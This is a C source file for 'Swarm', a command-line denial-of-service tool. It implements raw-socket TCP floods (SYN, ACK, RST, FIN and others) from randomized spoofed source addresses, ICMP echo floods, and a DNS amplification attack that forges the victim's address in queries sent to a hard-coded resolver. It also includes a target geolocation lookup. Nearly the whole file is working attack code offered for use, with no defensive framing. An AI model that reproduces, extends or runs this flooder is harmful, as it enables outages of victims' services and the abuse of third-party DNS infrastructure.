#include "Swarm.h"

#define SWARM_VERSION "Swarm 1.1.0"

//IP and Port Randomizer
void RandomIP(int* field_1, int* field_2, int* field_3, int* field_4, int* new_port)
{
    *field_1 = rand() % 256;
    *field_2 = rand() % 256;
    *field_3 = rand() % 256;
    *field_4 = rand() % 256;
    *new_port = rand() % 65535;
}

//Logo Printer
void Logo()
{
    printf("\n%s ╭─────────────────────────────────────────────────────╮ \n", COLOR_RED);
    printf("%s │                                                     │ \n", COLOR_RED);
    printf("%s │    ███████╗██╗    ██╗ █████╗ ██████╗ ███╗   ███╗    │ \n", COLOR_RED);
    printf("%s │    ██╔════╝██║    ██║██╔══██╗██╔══██╗████╗ ████║    │ \n", COLOR_RED);
    printf("%s │    ███████╗██║ █╗ ██║███████║██████╔╝██╔████╔██║    │ \n", COLOR_RED);
    printf("%s │    ╚════██║██║███╗██║██╔══██║██╔══██╗██║╚██╔╝██║    │ \n", COLOR_RED);
    printf("%s │    ███████║╚███╔███╔╝██║  ██║██║  ██║██║ ╚═╝ ██║    │ \n", COLOR_RED);
    printf("%s │    ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    │ \n", COLOR_RED);
    printf("%s │                                                     │ \n", COLOR_RED);
    printf("%s ╰─────────────────────────────────────────────────────╯ \n\n", COLOR_RED);
}

//TCP Flooder
void TCPFlood() {

    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    //Declaring Datagram and Source IP Variables
    char datagram[4096] , source_ip[32];
    
    //Create a Raw Socket
    int sck = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    //IP Header
    struct iphdr *iph = (struct iphdr *) datagram;
    
    //TCP Header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    
    //Setting Base Source IP 
    strcpy(source_ip , "192.168.1.2");
   
    //Setting Up Socket Configuration
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr (target_ip);
     
    //Zero Out the Buffer
    memset(datagram, 0, 4096);
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); //Total Packet Lenght
    iph->id = htons(54321); //ID of this packet
    iph->frag_off = 0;
    iph->ttl = 255; //Setting Time-To-Live
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; //Set to 0 before calculating Checksum
    iph->saddr = inet_addr (source_ip); //Spoof the Source IP Address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn=0;
    tcph->ack=0;
    tcph->fin=0;
    tcph->rst=0;
    tcph->psh=0;
    tcph->urg=0;
    tcph->window = htons (5840); //Maximum size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    switch (attack_mode)
    {
        case 1:
        tcph->syn=1;
            break;
        case 2:
        tcph->ack=1;
            break;
        case 3:
        tcph->syn=1;
        tcph->ack=1;
        case 4:
        tcph->rst=1;
            break;
        case 5:
        tcph->psh=1;
            break;
        case 6:
        tcph->urg=1;
            break;
        case 7:
        tcph->fin=1;
            break;
        case 8:
        tcph->fin=1;
        tcph->ack=1;
            break;
        default:
        tcph->syn=1;
            break;
    }
    
    //IP Checksum 
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
     
    int one = 1;
    const int *val = &one;
    
    if (setsockopt (sck, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);

        printf("%s [%02d:%02d:%02d] [%sERROR%s] Error While Setting IP_HDRINCL. Error number : %d . Error message : %s \n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL, errno , strerror(errno));
        exit(0);
    }
   
    while (1)
    {
        int f1 = 0, f2 = 0, f3 = 0, f4 = 0, new_port = 0;
        char new_source_ip[32];
    
        RandomIP(&f1, &f2, &f3, &f4, &new_port); //Generate the new Spoofed IP and Port
        sprintf(new_source_ip, "%d.%d.%d.%d", f1, f2, f3, f4);
        
        strcpy(source_ip , new_source_ip); //Copy new generated IP into previous IP
        iph->saddr = inet_addr (source_ip); //Spoof the Source IP address
        tcph->source = htons (new_port); //Spoof the source port
        
        tcph->seq = rand() % 4294967294; //Randomize Sequence Number
        tcph->ack_seq = rand() % 4294967294; //Randomize Acknowledged Sequence Number
        
        //Send the packet
        if (sendto (sck, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);

            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        }
        
        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
    }
   
   close(sck);
}

//ICMP Flood
void ICMPFlood() {

    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    //Declaring Datagram and Source IP Variables
    char datagram[4096] , source_ip[32];
    int payload_size = 0, sent_size = 0;
    
    //Creating RAW Socket
    int sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     
    //Calculate total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char* packet = (char*) malloc (packet_size);
                    
    if (!packet) 
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);

        printf("%s [%02d:%02d:%02d] [%sERROR%s] Out Of Memory.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        close(sck);
    }
     
    //IP Header
    struct iphdr* ip = (struct iphdr*) packet;
    struct icmphdr* icmp = (struct icmphdr*) (packet + sizeof (struct iphdr));
     
    //Zero out the Buffer
    memset(packet, 0, packet_size);
 
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = inet_addr (source_ip); //Spoof the Source IP Address
    ip->daddr = inet_addr (target_ip);
 
    switch (attack_mode)
    {
        case 1:
        icmp->type = 8;
            break;
        case 2:
        icmp->type = 0;
            break;
        default:
        icmp->type = 8;
            break;
    }
 
    icmp->code = 0;
    icmp->un.echo.sequence = 0;
    icmp->un.echo.id = 0;

    //Checksum
    icmp->checksum = 0;
     
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr (target_ip);
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
     
    while (1)
    {
        int f1 = 0, f2 = 0, f3 = 0, f4 = 0, new_port = 0;
        char new_source_ip[32];
    
        RandomIP(&f1, &f2, &f3, &f4, &new_port); //Generate the new Spoofed IP and Port
        sprintf(new_source_ip, "%d.%d.%d.%d", f1, f2, f3, f4);
        
        strcpy(source_ip , new_source_ip); //Copy new generated IP into previous IP
        ip->saddr = inet_addr (source_ip); //Spoof the Source IP address
         
        icmp->un.echo.sequence = rand(); //Randomize Sequence
        icmp->un.echo.id = rand(); //Randomize ID
        
        //Randomize ICMP Payload 
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        
        icmp->checksum = 0;
        icmp->checksum = csum((unsigned short*)icmp, sizeof(struct icmphdr) + payload_size);
         
        if ( (sent_size = sendto(sck, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 0) 
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);

            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            break;
        }
         
        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
    }
     
    close(sck);
}

//DNS Amplification Flood
void DAFlood() {

    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    // Building the DNS Request Data Packet
    unsigned char dns_data[128];
    unsigned char *dns_name, dns_rcrd[32];
    
    dns_hdr *dns = (dns_hdr *)&dns_data;
    dns_hdr_create(dns);

    dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
    strcpy(dns_rcrd, "www.google.com");
    dns_format(dns_name , dns_rcrd);
    
    query *q;
    q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);
    
    // Building the IP and UDP Headers
    char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) +1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr("208.80.184.69");
    
    iph *ip = (iph *)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(target_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = csum((unsigned short *)datagram, ip->tot_len);
    
    udph *udp = (udph *)(datagram + sizeof(iph));
    udp->source = htons(target_port);
    udp->dest = htons(53);
    udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query));
    udp->check = 0;
    
    //Pseudoheader Creation and Checksum Calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(target_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));

    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    psgram = malloc(pssize);
    
    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));
        
    udp->check = csum((unsigned short *)psgram, pssize);
    
    //Send Data
    int sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (sck == -1)
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);

        printf("%s [%02d:%02d:%02d] [%sERROR%s] Could Not Create Socket.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        exit(0);
    }

    while (1)
    {
        if (sendto(sck, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) 
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);

            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        
            break;
        }

        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
    }
    
    free(psgram);
    close(sck);
}

//Main Function
int main (int argc, char const *argv[])
{
    Logo();
    
    signal(SIGINT, INThandler);
    
    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);
    
    for (int a = 0; a < argc; a++)
    {
        if(strcmp("--help", argv[a]) == 0 || strcmp("-h", argv[a]) == 0)
        {
            printf("  %sAvailable Parameters :%s\n   ├─── -h/--help : Shows This Help Page \n   ├─── -v/--version : Shows Swarm Version \n   └─── -t/--types : Shows A List Of All Flood Types \n\n", COLOR_RED, COLOR_WHITE);
            exit(0);
        }
        
        if(strcmp("--version", argv[a]) == 0 || strcmp("-v", argv[a]) == 0)
        {
            printf("               %s%s - Made By Adler\n\n", COLOR_WHITE, SWARM_VERSION);
            exit(0);
        }
        
        if(strcmp("--types", argv[a]) == 0 || strcmp("-t", argv[a]) == 0)
        {
            printf("  %sFlood Types :%s\n    ├─── Type 1 : SYN [TCP] \n    ├─── Type 2 : ACK [TCP] \n    ├─── Type 3 : SYN-ACK [TCP] \n    ├─── Type 4 : RST [TCP] \n    ├─── Type 5 : PSH [TCP] \n    ├─── Type 6 : URG [TCP] \n    ├─── Type 7 : FIN [TCP] \n    ├─── Type 8 : FIN-ACK [TCP] \n    ├─── Type 9 : E-REQUEST [ICMP] \n    ├─── Type 10 : E-REPLY [ICMP] \n    └─── Type 11 : DNS-AMP [UDP] \n\n", COLOR_RED, COLOR_WHITE);
            exit(0);
        }

        if(strcmp("--scan", argv[a]) == 0 || strcmp("-s", argv[a]) == 0)
        {
            int sd;
            struct http_message msg;
            char querylink[150];

            char query_type[20][20] = { "query", "reverse", "mobile", "proxy", "hosting", "org", "isp", "as", "asname", "continent", "continentCode", "country", "countryCode", "regionName", "region", "city", "zip", "timezone", "lat", "lon" };
            char query_name[20][30] = { "├─ Query", "├─ Reverse DNS", "├─ Mobile", "├─ Proxy", "├─ Hosting", "├─ Organisation", "├─ ISP", "├─ Autonomous System", "└─ Autonomous System Name", "├─ Continent", "├─ Continent Code", "├─ Country", "├─ Country Code", "├─ Region Name", "├─ Region", "├─ City", "├─ ZIP Code", "├─ Timezone", "├─ Latitude", "└─ Longitude" };

            printf("%s IP or Hostname %s>> %s", COLOR_WHITE, COLOR_RED, COLOR_WHITE);
            scanf("%100s", target_ip);
            printf("\n");

            printf("%s Global Informations :%s\n", COLOR_RED, COLOR_WHITE);
            for (int i = 0; i < 9; i++)
            {
                sprintf(querylink, "http://ip-api.com/csv/%s?fields=%s&lang=en", target_ip, query_type[i]);
                if ((sd = http_request(querylink)) < 1) { perror("http_request"); return -1; }
                memset(&msg, 0, sizeof(msg));
                while (http_response(sd, &msg) > 0) {
                    if (msg.content) {
                        printf("   %s : %s", query_name[i], msg.content);
                    }
                }
                close(sd);
            }

            printf("\n");

            printf("%s Geographical Informations :%s\n", COLOR_RED, COLOR_WHITE);
            for (int i = 10; i < 20; i++)
            {
                sprintf(querylink, "http://ip-api.com/csv/%s?fields=%s&lang=en", target_ip, query_type[i]);
                if ((sd = http_request(querylink)) < 1) { perror("http_request"); return -1; }
                memset(&msg, 0, sizeof(msg));
                while (http_response(sd, &msg) > 0) {
                    if (msg.content) {
                        printf("   %s : %s", query_name[i], msg.content);
                    }
                }
                close(sd);
            }

            printf("\n");

            return 0;
        }
    }
    
    if(argc < 4)
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);

        printf("%s [%02d:%02d:%02d] [%sERROR%s] Incorrect Usage : ./Swarm <IPv4> <Port> <Flood Type>\n Use ' ./Swarm --help ' To Get Help.\n\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        exit(1);
    }

    strncpy( target_ip, argv[1], 16 );
    target_port = atoi(argv[2]);
    attack_mode = atoi(argv[3]);
    
    char attack_mode_str[126];
    
    switch (attack_mode)
    {
        case 1:
            strcpy(attack_mode_str, "TCP - SYN");
            break;
        case 2:
            strcpy(attack_mode_str, "TCP - ACK");
            break;
        case 3:
            strcpy(attack_mode_str, "TCP - SYN-ACK");
            break;
        case 4:
            strcpy(attack_mode_str, "TCP - RST");
            break;
        case 5:
            strcpy(attack_mode_str, "TCP - PSH");
            break;
        case 6:
            strcpy(attack_mode_str, "TCP - URG");
            break;
        case 7:
            strcpy(attack_mode_str, "TCP - FIN");
            break;
        case 8:
            strcpy(attack_mode_str, "TCP - FIN-ACK");
            break;
        case 9:
            strcpy(attack_mode_str, "ICMP - E-REQUEST");
            break;
        case 10:
            strcpy(attack_mode_str, "ICMP - E-REPLY");
            break;
        case 11:
            strcpy(attack_mode_str, "UDP - DNS Amplification");
            break;
        default:
            attack_mode = 1;
            strcpy(attack_mode_str, "TCP - SYN");
            break;
    }
    
    char target_infos[512];
    sprintf(target_infos, "%s  %sTarget Parameters :%s \n    ├── IP : %s\n    ├── Port : %d\n    └── Type : %s", COLOR_NORMAL, COLOR_RED, COLOR_WHITE, target_ip, target_port, attack_mode_str);
    printf(target_infos);
    printf("\n\n");

    t_log = time(NULL);
    tm = *localtime(&t_log);
    printf("%s [%02d:%02d:%02d] [%sINFO%s] Preparing Attack...", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_BLUE, COLOR_NORMAL);
    fflush(stdout);

    usleep(50000);

    t_log = time(NULL);
    tm = *localtime(&t_log);
    printf("\n%s [%02d:%02d:%02d] [%sSUCCESS%s] Attack Started.\n\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_GREEN, COLOR_NORMAL);

    if(attack_mode == 9 || attack_mode == 10)
        ICMPFlood();
    else if(attack_mode == 11)
        DAFlood();
    else
        TCPFlood();
       
    return 0;
}
